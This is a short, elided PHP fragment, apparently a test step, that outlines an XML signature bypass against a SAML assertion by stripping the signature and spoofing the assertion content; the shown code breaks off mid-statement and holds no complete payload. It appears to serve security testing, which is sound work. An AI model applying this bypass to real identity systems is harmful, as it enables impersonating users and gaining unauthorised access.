...
public function iExploitTheXMLSignatureBypass()
{
    ...
    // 1. Clone original assertion and strip its signature
    ...
    // 3. Remove Signature from current Assertion
    $assertion->removeChild($signature);

    // 4. Spoof assertion content
    $nameId = $xpath->query(
